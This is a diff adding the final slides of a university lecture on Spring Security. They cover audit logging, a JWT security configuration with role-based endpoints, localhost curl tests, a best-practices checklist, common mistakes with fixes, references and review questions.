+  private String action;
+  private String entityType;
+  private String entityId;
+  private String details;
+  private String ipAddress;
+  private LocalDateTime timestamp;
+}</pre>
+      </div>
+      <div class="col">
+        <h3>Spring Security Event Listener:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Component
+@RequiredArgsConstructor
+public class SecurityEventListener {
+
+  private final AuditLogRepository auditRepo;
+
+  @EventListener
+  public void onLoginSuccess(
+      AuthenticationSuccessEvent event) {
+    AuditLog log = new AuditLog();
+    log.setUsername(event.getAuthentication()
+      .getName());
+    log.setAction("LOGIN_SUCCESS");
+    log.setTimestamp(LocalDateTime.now());
+    auditRepo.save(log);
+  }
+
+  @EventListener
+  public void onLoginFailure(
+      AbstractAuthenticationFailureEvent event) {
+    AuditLog log = new AuditLog();
+    log.setUsername((String) event
+      .getAuthentication().getPrincipal());
+    log.setAction("LOGIN_FAILED");
+    log.setDetails(event.getException()
+      .getMessage());
+    auditRepo.save(log);
+  }
+}</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">33</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>PRACTICAL EXAMPLE — E-LEARNING SYSTEM</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Security Configuration for the Project:</h3>
+        <pre style="background:#f5f5f5; padding:10px; border-radius:6px; font-size:11px;">
+@Configuration
+@EnableWebSecurity
+@EnableMethodSecurity
+@RequiredArgsConstructor
+public class SecurityConfig {
+
+  private final JwtAuthFilter jwtFilter;
+  private final UserDetailsService userDetailsService;
+
+  @Bean
+  public SecurityFilterChain filterChain(
+      HttpSecurity http) throws Exception {
+    return http
+      .csrf(csrf -> csrf.disable())
+      .cors(Customizer.withDefaults())
+      .sessionManagement(s -> s
+        .sessionCreationPolicy(STATELESS))
+      .authorizeHttpRequests(auth -> auth
+        .requestMatchers("/api/auth/**")
+          .permitAll()
+        .requestMatchers("/api/courses")
+          .permitAll()
+        .requestMatchers("/api/admin/**")
+          .hasRole("ADMIN")
+        .requestMatchers("/api/teacher/**")
+          .hasAnyRole("TEACHER","ADMIN")
+        .anyRequest().authenticated())
+      .addFilterBefore(jwtFilter,
+        UsernamePasswordAuthenticationFilter.class)
+      .build();
+  }
+}</pre>
+      </div>
+      <div class="col">
+        <h3>Endpoints by role:</h3>
+        <table class="table-small">
+          <thead><tr><th>Endpoint</th><th>Role</th></tr></thead>
+          <tbody>
+            <tr><td>POST /auth/login</td><td>Public</td></tr>
+            <tr><td>POST /auth/register</td><td>Public</td></tr>
+            <tr><td>GET /courses</td><td>Public</td></tr>
+            <tr><td>POST /enrollments</td><td>STUDENT</td></tr>
+            <tr><td>POST /courses</td><td>TEACHER, ADMIN</td></tr>
+            <tr><td>PUT /courses/{id}</td><td>Owner only</td></tr>
+            <tr><td>DELETE /users/{id}</td><td>ADMIN</td></tr>
+          </tbody>
+        </table>
+        <h3>Test with curl:</h3>
+        <pre style="background:#f5f5f5; padding:8px; border-radius:6px; font-size:11px;">
+# Login
+curl -X POST localhost:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"sv01@cmc.vn",
+    "password":"123456"}'
+
+# Use token
+TOKEN="eyJhbGc..."
+curl localhost:8080/api/courses \
+  -H "Authorization: Bearer $TOKEN"</pre>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">34</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SECURITY BEST PRACTICES CHECKLIST</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3 style="color:#70AD47;">Authentication:</h3>
+        <ul>
+          <li>✅ BCrypt password hashing (cost ≥ 12)</li>
+          <li>✅ JWT with short expiration + refresh token</li>
+          <li>✅ 2FA for important accounts</li>
+          <li>✅ Rate limit login endpoint</li>
+          <li>✅ Account lockout after N failed attempts</li>
+          <li>✅ Strong password policy</li>
+        </ul>
+        <h3 style="color:#70AD47;">Authorization:</h3>
+        <ul>
+          <li>✅ RBAC with @PreAuthorize</li>
+          <li>✅ Default deny — explicitly allow</li>
+          <li>✅ Validate ownership at method level</li>
+          <li>✅ API Gateway for centralized auth</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3 style="color:#70AD47;">Network & Data:</h3>
+        <ul>
+          <li>✅ HTTPS only (HSTS)</li>
+          <li>✅ TLS 1.2+ with strong ciphers</li>
+          <li>✅ CORS only allow necessary origins</li>
+          <li>✅ Encryption at rest (DB, backups)</li>
+          <li>✅ Sensitive data masking in logs</li>
+        </ul>
+        <h3 style="color:#70AD47;">Input & Output:</h3>
+        <ul>
+          <li>✅ Validate all input (whitelist)</li>
+          <li>✅ Parameterized queries (no SQL injection)</li>
+          <li>✅ Output encoding (no XSS)</li>
+          <li>✅ Content Security Policy</li>
+          <li>✅ File upload: type, size, virus scan</li>
+        </ul>
+        <div class="ai-box">
+          <div class="ai-label">&#x2728; MODERN TRENDS</div>
+          <p><strong>DevSecOps</strong> — security integrated into CI/CD: SAST, DAST, dependency check, container scanning.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">35</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>COMMON SECURITY MISTAKES</h2></div>
+  <div class="slide-body">
+    <table>
+      <thead><tr><th style="width:30%">Mistake</th><th style="width:35%">Consequence</th><th>Fix</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Hardcode credentials</strong></td><td>Password exposed when pushing code</td><td>Environment variables, Vault</td></tr>
+        <tr><td><strong>MD5/SHA1 hash password</strong></td><td>Easy to crack</td><td>BCrypt with cost ≥ 12</td></tr>
+        <tr><td><strong>Disable CSRF for web app</strong></td><td>Vulnerable to CSRF</td><td>Enable CSRF, use token</td></tr>
+        <tr><td><strong>Allow @CrossOrigin("*")</strong></td><td>Any site can make requests</td><td>Whitelist specific origins</td></tr>
+        <tr><td><strong>Return Exception details to client</strong></td><td>Leaks system information</td><td>Generic error message</td></tr>
+        <tr><td><strong>Log password / sensitive data</strong></td><td>Leaked via log files</td><td>Mask before logging</td></tr>
+        <tr><td><strong>No input validation</strong></td><td>SQL injection, XSS</td><td>Bean Validation, sanitize</td></tr>
+        <tr><td><strong>Default permitAll()</strong></td><td>All endpoints public</td><td>Default authenticated()</td></tr>
+        <tr><td><strong>Long-lived JWT (24h+)</strong></td><td>Leaked token dangerous for long</td><td>Short access (15 min) + refresh</td></tr>
+        <tr><td><strong>Store JWT in localStorage</strong></td><td>XSS can read it</td><td>HttpOnly cookie or memory</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <span class="slide-num">36</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>REFERENCES & TOOLS</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Official documentation:</h3>
+        <ul>
+          <li><strong>Spring Security Docs</strong> <a class="ref" href="https://docs.spring.io/spring-security/reference/" target="_blank">[link]</a></li>
+          <li><strong>OWASP Cheat Sheets</strong> <a class="ref" href="https://cheatsheetseries.owasp.org/" target="_blank">[link]</a></li>
+          <li><strong>OWASP Top 10</strong> <a class="ref" href="https://owasp.org/www-project-top-ten/" target="_blank">[link]</a></li>
+          <li><strong>JWT.io</strong> <a class="ref" href="https://jwt.io" target="_blank">[link]</a></li>
+          <li><strong>OAuth2 RFC 6749</strong> <a class="ref" href="https://datatracker.ietf.org/doc/html/rfc6749" target="_blank">[link]</a></li>
+        </ul>
+        <h3>Dev/test tools:</h3>
+        <ul>
+          <li><strong>Postman</strong> — test API with auth</li>
+          <li><strong>jwt.io debugger</strong> — decode JWT</li>
+          <li><strong>OWASP ZAP</strong> — security scanner</li>
+          <li><strong>Burp Suite</strong> — pen testing</li>
+          <li><strong>SonarQube</strong> — SAST</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Recommended books:</h3>
+        <ul>
+          <li><strong>"Spring Security in Action"</strong> — Laurentiu Spilca</li>
+          <li><strong>"OAuth 2.0 in Action"</strong> — Justin Richer</li>
+          <li><strong>"Web Application Security"</strong> — Andrew Hoffman</li>
+          <li><strong>"The Web Application Hacker's Handbook"</strong></li>
+        </ul>
+        <h3>Online courses:</h3>
+        <ul>
+          <li>Spring Academy (spring.io)</li>
+          <li>Baeldung Spring Security</li>
+          <li>OWASP WebGoat (hands-on)</li>
+        </ul>
+        <div class="ai-box">
+          <div class="ai-label">&#x2728; MODERN TRENDS</div>
+          <p><strong>Zero Trust Architecture</strong> — trust no one/device, always verify every request, even from the internal network.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">37</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-content" style="background-image:url('../../shared/bg-content.jpg')">
+  <img class="slide-logo" src="../../shared/logo-white.png" alt="CMC University">
+  <div class="slide-header"><h2>SUMMARY & REVIEW QUESTIONS</h2></div>
+  <div class="slide-body">
+    <div class="two-columns">
+      <div class="col">
+        <h3>Core knowledge:</h3>
+        <ul>
+          <li><strong>Spring Security</strong> — authentication + authorization</li>
+          <li><strong>Filter Chain</strong> → Manager → Provider → Context</li>
+          <li><strong>RBAC:</strong> Roles (coarse) vs Authorities (fine-grained)</li>
+          <li><strong>JWT:</strong> Header.Payload.Signature, stateless</li>
+          <li><strong>OAuth2:</strong> third-party login (Google, GitHub)</li>
+          <li><strong>HTTPS:</strong> encryption for client-server communication</li>
+        </ul>
+      </div>
+      <div class="col">
+        <h3>Review questions:</h3>
+        <ul>
+          <li>1. Authentication vs Authorization?</li>
+          <li>2. How does the Spring Security Filter Chain work?</li>
+          <li>3. How many parts does JWT have? Describe each part.</li>
+          <li>4. How to configure RBAC in Spring Security?</li>
+          <li>5. What is BCrypt? Why not use MD5/SHA?</li>
+          <li>6. What is a CSRF attack? How to prevent it?</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <span class="slide-num">38</span>
+  <span class="slide-author">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+<section class="slide slide-title-page" style="background-image:url('../../shared/bg-title.png'); justify-content:center; text-align:center; flex-direction:column; align-items:center;">
+  <img src="../../shared/logo-white.png" alt="CMC University" style="height:80px; margin-bottom:30px;">
+  <h1 style="font-family:'Open Sans',sans-serif; font-size:72px; font-weight:700; color:white; text-shadow:2px 3px 10px rgba(0,0,0,0.4);">Thank You!</h1>
+  <p style="font-size:28px; color:white; margin-top:20px; font-weight:300;">Questions? Discussion?</p>
+  <span class="slide-num" style="color:rgba(255,255,255,0.7);">39</span>
+  <span class="slide-author" style="color:rgba(255,255,255,0.8);">MSc. Nguyen Viet Hung - CMC University</span>
+</section>
+
+</body>
+</html>
